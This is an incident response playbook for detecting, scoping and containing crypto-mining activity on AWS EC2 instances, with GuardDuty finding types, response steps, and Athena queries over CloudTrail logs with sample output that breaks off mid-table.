# EC2 crypto mining playbook

## Preparation

### The threat

This playbook covers the detection of unusual behavior from an EC2 instance that is potentially been used for bitcoin mining. There are two observed patterns, one, is an existing EC2 instance compromise and, second, EC2 instances are deployed solemnly for this purpose, the latter is more common than the former. Indicators of compromise such as request to increase service quotas request, provisioning of a new VPC, deployment of a large number of high-end GPU based EC2 instances, use of an AMI copied from another AWS account, no ingress SSH access, and egress traffic to known bitcoin related destination are usually present.  Detection for this activity can be done by using ML/AI based findings from GuardDuty such as [CryptoCurrency:EC2/BitcoinTool.B](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html#cryptocurrency-ec2-bitcointoolb), [CryptoCurrency:EC2/BitcoinTool.B!DNS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html#cryptocurrency-ec2-bitcointoolbdns), alert from third-party or custom build security tool, it is possible to engineer detection using a SIEM by correlating the indicator of compromise previously listed. It is crucial to have pre-built containment both human initiated and event triggered automation to immediately stop the EC2 instances, prevent egress and ingress VPC traffic, disable all principals compromised.

### Objectives

Throughout the execution of the playbook, focus on the _***desired outcomes***_, taking notes for enhancement of incident response capabilities.

#### Determine: 

* **Vulnerabilities exploited**
* **Exploits and tools observed**
* **Actor's intent**
* **Actor's attribution**
* **Damage inflicted to the environment and business**

#### Recover:

* **Return to original and hardened configuration**

#### Enhance CAF Security Perspective components:
[AWS Cloud Adoption Framework Security Perspective](https://d0.awsstatic.com/whitepapers/AWS_CAF_Security_Perspective.pdf)
* **Directive**
* **Detective**
* **Responsive**
* **Preventative**

![Image](images/aws_caf.png)

* * *

### Response steps

1. [**ANALYSIS**] Validate alert by checking its source
2. [**ANALYSIS**] Identity account owner/custodian
2. [**ANALYSIS**] Identify EC2 instances compromised and owner/custodian   
2. [**ANALYSIS**] Identify compromised IAM credentials related to the incident (check RunInstances userIdentity element in CloudTrail)
2. [**ANALYSIS**] If compromised IAM credentials, open a new incident and use the ```IAM Credential Exposure``` playbook   
4. [**ANALYSIS**] Take snapshots of all involved instances.
4. [**ANALYSIS**] Capture memory of all involved instances.   
3. [**CONTAINMENT**] Stop as many instances as possible after approval by owner/customer. If no instances are used for business purposes, stop them all.
4. [**ANALYSIS**] Use Athena to pull 15 days of EC2 activity from CloudTrail logs
4. [**ANALYSIS**] Enumerate all EC2 instance IDs from CloudTrail logs   
5. [**ANALYSIS**] Use Athena to pull 15 days of EC2 instance activity from VPC Flow logs 
6. [**ANALYSIS**] Establish reputation for all public IP addresses
7. [**ANALYSIS**] Use Athena to pull the activity performed by the public IP addresses the EC2 instances have communicated with   
8. [**ANALYSIS**] Discover all resources provisioned, modified, and deleted by the previous step
9. [**CONTAINMENT**] Perform containment of all rogue resources provisioned
10. [**CONTAINMENT**] Perform containment of existing resources modified with approval from owner/custodian
11. [**ANALYSIS**] Determine if data was exfiltrated, modified, or deleted. Figure out the classification for all data sets touched.
12. [**ANALYSIS**] Expand log scope to 90 days or further and repeat steps 1-12. Use your judgment on how far back to go.
13. [**ANALYSIS**] Estimate attribution and attack type (targeted or opportunistic)
14. [**ANALYSIS**] Preserve all relevant infrastructure and service resources for forensics investigation
15. [**ERADICATION**] Perform eradication (delete rogue resources, apply security updates and harden configuration)
16. [**RECOVERY**] Perform recovery by restoring system data and rebuilding components
17. [**POST-INCIDENT ACTIVITY**] Perform post-incident activity for preparation enhancement

#### Incident Response Life Cycle (NIST 800-61r2)
[NIST Computer Security Incident Handling Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
![Image](images/nist_life_cycle.png)

* * * 

### Incident Classification & Handling

* **Tactics, techniques, and procedures**: Exfiltration of credentials
* **Category**: IAM credential exposure
* **Resource**: IAM
* **Roles to Assume**:
  * **SecurityAnalystRole**: provides Athena querying and GuardDuty R/O access
  * **SecurityAdminRole**: configure and maintain Athena
  * **SecurityDeployRole**: deploy AWS CDK app or CloudFormation stacks
  * **SecurityBreakGlassRole**: account administrator, for any incident response related activity requiring elevation upon approval 
* **Tooling**: [AWS Command Line Interface](https://docs.aws.amazon.com/cli/latest/index.html) (CLI), [Amazon Athena](https://docs.aws.amazon.com/athena/latest/ug/querying-AWS-service-logs.html)
* **Indicators**: Cyber Threat Intelligence, Third Party Notice
* **Log Sources**: AWS CloudTrail, AWS Config, VPC Flow Logs, Amazon GuardDuty
* **Teams**: Security Operations Center (SOC), Forensic Investigators, Cloud Engineering

* * *

### Activity simulated for this playbook

The file ```simulation/simulate_crypto_mining_activity.sh``` is a bash script using AWS CLI simulating an actor using IAM User Access Keys to spin EC2 instances with crypto mining tools in EC2 User Data. 

* * *

## Incident Handling Process

### The incident response process has the following stages:

* Part 1: Analysis - Validation
* Part 2: Analysis - Scope
* Part 3: Analysis - Impact
* Part 4: Containment
* Part 5: Eradication
* Part 6: Recovery 
* Part 7: Post-Incident Activity

### Part 1: Analysis - Validation

* Check in the GuardDuty console the triggered findings filtering by ```finding type```
  * Reference: https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_filter-findings.html
  * Findings expected:
    * [CryptoCurrency:EC2/BitcoinTool.B](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html#cryptocurrency-ec2-bitcointoolb)
    * [CryptoCurrency:EC2/BitcoinTool.B!DNS](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-ec2.html#cryptocurrency-ec2-bitcointoolbdns)
* Each finding will enumerate the EC2 instance ID involved.

#### Retrieve list of compromised EC2 instance IDs from GuardDuty

* The file ```response_scripts/retrieve_guardduty_findings.sh``` is a bash script using AWS CLI to retrieve EC2 instance IDs
* You can modify this script to retrieve other elements of the GuardDuty findings by changing the jq filter 
* It generates an output file named ```instance_ids.txt``` that can be parsed for the unique EC2 instance IDs

```
cat instance_ids.txt | sed 's/ /\n/g' | sort -n | uniq
i-021345abcdef678a
i-021345abcdef678b
i-021345abcdef678c
i-021345abcdef678d
```

### Part 2: Analysis - Scope

Assume the SecurityAnalystRole on the AWS account hosting the Athena workgroup IRWorkshopWorkgroup.

1. Retrieve past 7 days of the following activity for the EC2 instances identified during validation:
    * Service activity (API calls) from CloudTrail logs
    * Infrastructure and application network activity from VPC Flow logs based on the source IP addresses used for API calls
2. Establish reputation for source IP address list: 
    * Use internal and external threat intelligence
    * Who owns the source IP addresses used?
3. Using API call history, determine resources created, modified, deleted, and probed
4. Document resource inventory by AWS Service and call made
5. Analyze EC2 attributes such as AMI, User Data, Instance Profile

#### Athena queries

```
-- check all EC2 actions performed involving the EC2 instances
SELECT awsregion, eventsource, eventname, readonly, errorcode, errormessage, count(eventid) as COUNT 
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE eventsource = 'ec2.amazonaws.com' AND
      (date_partition >= '2021/07/22' AND
      date_partition <= '2021/07/29') 
      AND 
     (
       requestparameters LIKE '%i-021345abcdef678a%' OR
       requestparameters LIKE '%i-021345abcdef678b%' OR
       requestparameters LIKE '%i-021345abcdef678v%' OR
       requestparameters LIKE '%i-021345abcdef678d%' OR
       responseelements  LIKE '%i-021345abcdef678e%' OR
       responseelements  LIKE '%i-021345abcdef678f%' OR
       responseelements  LIKE '%i-021345abcdef678g%' OR
       responseelements  LIKE '%i-021345abcdef678h%'
      )
GROUP BY awsregion, eventsource, eventname, readonly, errorcode, errormessage
ORDER BY COUNT DESC;
```

awsregion  |  arn                                                                                          |  eventsource        |  eventname               |  readonly  |  errorcode  |  errormessage  |  COUNT
-----------|-----------------------------------------------------------------------------------------------|---------------------|--------------------------|------------|-------------|----------------|-------
us-east-1  |  arn:aws:sts::999999999999:assumed-role/DevOps/MaryMajor                                |  ec2.amazonaws.com  |  DescribeInstanceStatus  |  true      |             |                |  4
us-east-1  |  arn:aws:iam::999999999999:user/pipeline                                                      |  ec2.amazonaws.com  |  RunInstances            |  false     |             |                |  4
us-east-1  |  arn:aws:sts::999999999999:assumed-role/AWSServiceRoleForAmazonGuardDuty/GuardDutyAssumeRole  |  ec2.amazonaws.com  |  DescribeInstances       |  true      |             |                |  4
us-east-1  |  arn:aws:sts::999999999999:assumed-role/DevOps/MaryMajor                                |  ec2.amazonaws.com  |  DescribeAddresses       |  true      |             |                |  4
us-east-1  |  arn:aws:sts::999999999999:assumed-role/DevOps/MaryMajor                                |  ec2.amazonaws.com  |  DescribeInstances       |  true      |             |                |  4


```
-- retrieve past 7 days of source IP addresses and user agents used for API calls
SELECT sourceipaddress, useragent, count(eventid) as COUNT 
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
GROUP BY sourceipaddress, useragent
ORDER BY COUNT DESC
```

sourceipaddress  |  useragent                                                                                    |  COUNT
-----------------|-----------------------------------------------------------------------------------------------|-------
203.0.113.99     |  aws-cli/2.2.1 Python/3.8.8 Darwin/20.5.0 exe/x86_64 prompt/off command/ec2.run-instances     |  10
203.0.113.99     |  aws-cli/2.2.1 Python/3.8.8 Darwin/20.5.0 exe/x86_64 prompt/off command/ec2.describe-subnets  |  4
203.0.113.99     |  aws-cli/2.2.1 Python/3.8.8 Darwin/20.5.0 exe/x86_64 prompt/off command/ec2.describe-images   |  2
203.0.113.99     |  aws-cli/2.2.1 Python/3.8.8 Darwin/20.5.0 exe/x86_64 prompt/off command/ec2.describe-vpcs     |  2


```
-- retrieve useridentity.arn from past 7 days of API calls from source IP address
SELECT useridentity.arn, count(eventid) as COUNT 
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE sourceipaddress = '203.0.113.99'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
GROUP BY useridentity.arn
ORDER BY COUNT DESC
```

arn                                                                           |  COUNT
------------------------------------------------------------------------------|-------
arn:aws:sts::999999999999:assumed-role/DevOps/MaryMajor                       |  1257
arn:aws:iam::999999999999:user/pipeline                                       |  18

```
-- retrieve past 7 days of API calls for the IAM principal identified as deploying the EC2 instances
SELECT awsregion, eventsource, eventname, readonly, errorcode, errormessage, count(eventid) as COUNT 
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
GROUP BY awsregion, eventsource, eventname, readonly, errorcode, errormessage
ORDER BY COUNT DESC
```

awsregion  |  eventsource        |  eventname        |  readonly  |  errorcode  |  errormessage  |  COUNT
-----------|---------------------|-------------------|------------|-------------|----------------|-------
us-east-1  |  ec2.amazonaws.com  |  RunInstances     |  false     |             |                |  10
us-east-1  |  ec2.amazonaws.com  |  DescribeSubnets  |  true      |             |                |  4
us-east-1  |  ec2.amazonaws.com  |  DescribeVpcs     |  true      |             |                |  2
us-east-1  |  ec2.amazonaws.com  |  DescribeImages   |  true      |             |                |  2

```
-- retrieve additional information about changes made to the services
SELECT eventtime, awsregion, eventname, requestparameters, responseelements, errorcode, errormessage
FROM "irworkshopgluedatabase"."irworkshopgluetablecloudtrail"
WHERE useridentity.arn = 'arn:aws:iam::999999999999:user/pipeline'
      AND date_partition >= '2021/07/22'
      AND date_partition <= '2021/07/29'
      AND eventname IN ('RunInstances')
```

eventtime             |  awsregion  |  eventname     |  requestparameters                                                                                                                                                                                                                                                                                                                                               |  responseelements                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |  errorcode  |  errormessage
----------------------|-------------|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------|--------------
2021-07-29T01:39:30Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-0f6cbe2de726b03fc","disableApiTermination":false,"disableApiStop":false,"clientToken":"d95702e9-a3cb-4949-b8fb-6b2cef480df3"}  |  {"requestId":"1ae18d88-d151-4988-ab21-a79a87d6e0d0","reservationId":"r-08c28bb944ff4d214","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-0ba42452619fc45aa","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-192-168-2-146.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522770000,"placement":{"availabilityZone":"us-east-1a","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-0f6cbe2de726b03fc","vpcId":"vpc-0f7b220f37f9c9e31","privateIpAddress":"192.168.2.146","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"d95702e9-a3cb-4949-b8fb-6b2cef480df3","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-08dc82c399a7ac5f7","subnetId":"subnet-0f6cbe2de726b03fc","vpcId":"vpc-0f7b220f37f9c9e31","ownerId":"999999999999","status":"in-use","macAddress":"02:5e:e1:03:50:05","privateIpAddress":"192.168.2.146","privateDnsName":"ip-192-168-2-146.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0f28203758c34157f","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522770000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"192.168.2.146","privateDnsName":"ip-192-168-2-146.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:32Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-011e678c69ba872ee","disableApiTermination":false,"disableApiStop":false,"clientToken":"4848dac9-3b51-402c-8748-f68080259ee6"}  |  {"requestId":"62f70b6a-a094-47ac-b72a-1ca6cab44cde","reservationId":"r-0274de0c09d377689","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-007beca872e8e8724","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-192-168-1-234.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522772000,"placement":{"availabilityZone":"us-east-1b","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-011e678c69ba872ee","vpcId":"vpc-0f7b220f37f9c9e31","privateIpAddress":"192.168.1.234","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"4848dac9-3b51-402c-8748-f68080259ee6","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-09d94916985ca3555","subnetId":"subnet-011e678c69ba872ee","vpcId":"vpc-0f7b220f37f9c9e31","ownerId":"999999999999","status":"in-use","macAddress":"12:40:3b:66:13:3f","privateIpAddress":"192.168.1.234","privateDnsName":"ip-192-168-1-234.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0ceab196d312a9b5b","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522772000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"192.168.1.234","privateDnsName":"ip-192-168-1-234.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:35Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-01153e6dcc3d38d1d","disableApiTermination":false,"disableApiStop":false,"clientToken":"d5fc15e9-41fa-4167-ad3a-a332201c2f23"}  |  {"requestId":"a5252dd6-320f-4b32-b100-714157345bfc","reservationId":"r-065d25e14a2b6166e","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-02ac30fe2391d8209","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-192-168-3-174.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522774000,"placement":{"availabilityZone":"us-east-1b","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-01153e6dcc3d38d1d","vpcId":"vpc-0f7b220f37f9c9e31","privateIpAddress":"192.168.3.174","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"d5fc15e9-41fa-4167-ad3a-a332201c2f23","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-00e26e524e05cce20","subnetId":"subnet-01153e6dcc3d38d1d","vpcId":"vpc-0f7b220f37f9c9e31","ownerId":"999999999999","status":"in-use","macAddress":"12:dc:75:8e:cd:7b","privateIpAddress":"192.168.3.174","privateDnsName":"ip-192-168-3-174.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0505762823e6c64f7","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522774000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"192.168.3.174","privateDnsName":"ip-192-168-3-174.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:37Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-05da8fc8034c190a1","disableApiTermination":false,"disableApiStop":false,"clientToken":"147c7c4d-a40d-4eb6-b1df-9a3fa71290a6"}  |  {"requestId":"f2859949-51b8-4bec-90d1-461f43d5d386","reservationId":"r-051fe78cdbf4b1cc2","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-04cd5ef4dbee493af","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-192-168-0-251.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522777000,"placement":{"availabilityZone":"us-east-1a","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-05da8fc8034c190a1","vpcId":"vpc-0f7b220f37f9c9e31","privateIpAddress":"192.168.0.251","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"147c7c4d-a40d-4eb6-b1df-9a3fa71290a6","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-03c5c59c32ac9d021","subnetId":"subnet-05da8fc8034c190a1","vpcId":"vpc-0f7b220f37f9c9e31","ownerId":"999999999999","status":"in-use","macAddress":"02:d5:7d:fe:99:6b","privateIpAddress":"192.168.0.251","privateDnsName":"ip-192-168-0-251.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-050c333b86822c1f1","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-03b115d5658aebc55","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522777000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"192.168.0.251","privateDnsName":"ip-192-168-0-251.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:41Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-0eb259b3a172b2111","disableApiTermination":false,"disableApiStop":false,"clientToken":"2351067e-f9f0-48db-a06c-282c40b9699f"}  |  {"requestId":"207f612a-6b9e-4123-8e98-f25949f8c410","reservationId":"r-0482bba17e513788e","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-0a3d222d84db8be8b","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-29-22.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522781000,"placement":{"availabilityZone":"us-east-1c","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-0eb259b3a172b2111","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.29.22","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"2351067e-f9f0-48db-a06c-282c40b9699f","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-03c7dcfa1a1e46810","subnetId":"subnet-0eb259b3a172b2111","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"in-use","macAddress":"0a:c7:fb:b0:b0:f5","privateIpAddress":"172.31.29.22","privateDnsName":"ip-172-31-29-22.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0f91b211f3a0b6643","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522781000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.29.22","privateDnsName":"ip-172-31-29-22.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}        |             |
2021-07-29T01:39:43Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-05203a3964447da16","disableApiTermination":false,"disableApiStop":false,"clientToken":"907fc230-cd60-49b8-a9e1-7e273e07e181"}  |  {"requestId":"0dd4e96a-48a6-4dae-b6d1-90e9da46dab4","reservationId":"r-037b7bcbcb5d6a53e","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-0c1fb5da8838e29bb","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-81-101.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522783000,"placement":{"availabilityZone":"us-east-1b","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-05203a3964447da16","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.81.101","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"907fc230-cd60-49b8-a9e1-7e273e07e181","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-08e9316e473455459","subnetId":"subnet-05203a3964447da16","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"in-use","macAddress":"12:10:5c:0d:7f:dd","privateIpAddress":"172.31.81.101","privateDnsName":"ip-172-31-81-101.ec2.internal","sourceDestCheck":true,"interfaceType":"interface","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"attachment":{"attachmentId":"eni-attach-0fb4179f3a87f0723","deviceIndex":0,"networkCardIndex":0,"status":"attaching","attachTime":1627522783000,"deleteOnTermination":true},"privateIpAddressesSet":{"item":[{"privateIpAddress":"172.31.81.101","privateDnsName":"ip-172-31-81-101.ec2.internal","primary":true}]},"ipv6AddressesSet":{},"tagSet":{}}]},"ebsOptimized":false,"enaSupport":true,"cpuOptions":{"coreCount":1,"threadsPerCore":1},"capacityReservationSpecification":{"capacityReservationPreference":"open"},"enclaveOptions":{"enabled":false},"metadataOptions":{"state":"pending","httpTokens":"optional","httpPutResponseHopLimit":1,"httpEndpoint":"enabled"}}]}}  |             |
2021-07-29T01:39:46Z  |  us-east-1  |  RunInstances  |  {"instancesSet":{"items":[{"imageId":"ami-0c2b8ca1dad447f8a","minCount":1,"maxCount":1}]},"userData":"<sensitiveDataRemoved>","instanceType":"t2.nano","blockDeviceMapping":{},"monitoring":{"enabled":false},"subnetId":"subnet-0056282f6a8f9a4c4","disableApiTermination":false,"disableApiStop":false,"clientToken":"410fa79e-820a-4bcb-a299-14ff5f74ae6c"}  |  {"requestId":"7fe02d23-e2da-4f6d-9028-06a6183a2ce4","reservationId":"r-00363505342af1b80","ownerId":"999999999999","groupSet":{},"instancesSet":{"items":[{"instanceId":"i-07683a6aa450b5a58","imageId":"ami-0c2b8ca1dad447f8a","instanceState":{"code":0,"name":"pending"},"privateDnsName":"ip-172-31-44-182.ec2.internal","amiLaunchIndex":0,"productCodes":{},"instanceType":"t2.nano","launchTime":1627522786000,"placement":{"availabilityZone":"us-east-1d","tenancy":"default"},"monitoring":{"state":"disabled"},"subnetId":"subnet-0056282f6a8f9a4c4","vpcId":"vpc-045be8f0854ed7f0b","privateIpAddress":"172.31.44.182","stateReason":{"code":"pending","message":"pending"},"architecture":"x86_64","rootDeviceType":"ebs","rootDeviceName":"/dev/xvda","blockDeviceMapping":{},"virtualizationType":"hvm","hypervisor":"xen","clientToken":"410fa79e-820a-4bcb-a299-14ff5f74ae6c","groupSet":{"items":[{"groupId":"sg-0030477c71f7a0206","groupName":"default"}]},"sourceDestCheck":true,"networkInterfaceSet":{"items":[{"networkInterfaceId":"eni-0cfb00b23b3bc0ca8","subnetId":"subnet-0056282f6a8f9a4c4","vpcId":"vpc-045be8f0854ed7f0b","ownerId":"999999999999","status":"